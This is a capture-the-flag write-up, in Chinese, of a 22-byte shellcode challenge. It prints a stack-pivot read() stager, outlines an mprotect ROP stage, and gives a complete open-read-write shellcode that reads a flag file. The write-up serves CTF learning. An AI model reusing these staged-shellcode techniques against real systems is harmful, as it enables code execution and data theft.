# ShellcodeMaster

## 题目简述

程序只允许第一阶段 shellcode 占用 22 字节，并在读入后把原 shellcode 区域改为只执行（`--x`）；通用寄存器状态也不适合直接承载完整 ORW。目标是在极短代码中重新建立可控的 `read`，分阶段写入 ROP 和最终 shellcode。

## 解题过程

### 在静态可写区伪造栈

关键不是继续向原 shellcode 区写数据，而是把 `esp` 指向静态可写地址，并用一组 `push`/`pop` 在栈上准备 `read(0, buffer, 120)` 的参数。另一份[参赛者复现](https://hackmd.io/@pnck/hgame2024week2)给出的 19 字节思路如下：

```asm
mov esp, 0x404020
push 120
push 0
push 0
push rsp
pop rsi
pop rax
pop rdi
pop rdx
syscall
ret
```

执行三次 `push 0`/`push 120` 后，`pop` 顺序分别得到：

- `rsi = 0x404008`：后续数据写入地址；
- `rax = 0`：`read` 系统调用号；
- `rdi = 0`：标准输入；
- `rdx = 120`：明确的非零读取长度。

`read` 会覆盖伪造栈上的返回地址，因此可以让末尾 `ret` 进入下一段数据，反复扩展可用载荷。随后按顺序完成：

1. 多次 `read` 把 ROP 链放进 `.bss`；
2. ROP 调用 `mprotect`，把最终落点改成 `rwx`；
3. 再次 `read` 写入完整 ORW shellcode；
4. 跳转到 ORW shellcode 读取 flag。

### 最终 ORW

官方 PDF 中的完整 ORW 逻辑为：

```python
from pwn import asm

orw = asm(
    """
    push 0x67616c66
    mov rdi, rsp
    xor esi, esi
    push 2
    pop rax
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall

    mov edi, 1
    mov rsi, rsp
    push 1
    pop rax
    syscall
    """
)
```

字符串常量 `0x67616c66` 按小端序入栈后是 `flag`，三个系统调用依次是 `open`、`read`、`write`。

官方 PDF 还给了一段更短的第一阶段，其中 `mprotect` 后紧接 `cdq` 再执行 `read`。若 `mprotect` 正常返回 0，`cdq` 会把 `edx` 清零，使读取长度为 0；这段打印代码不能原样视为可复现利用。上面的伪栈方案显式设置 `rdx=120`，避免了该矛盾。

## 方法总结

- 核心技巧：在 22 字节限制下用 `mov esp, imm32` 和短 `push`/`pop` 指令构造可复用的 `read` trampoline。
- 识别信号：第一阶段极短、原代码区不可写，但存在固定可写地址和可执行的 `syscall; ret` 路径。
- 复用要点：短 shellcode 的每个寄存器都必须核对；尤其不能假定系统调用返回后 `rdx` 仍保留读取长度。先获得稳定的二阶段读入，再考虑完整 ORW。
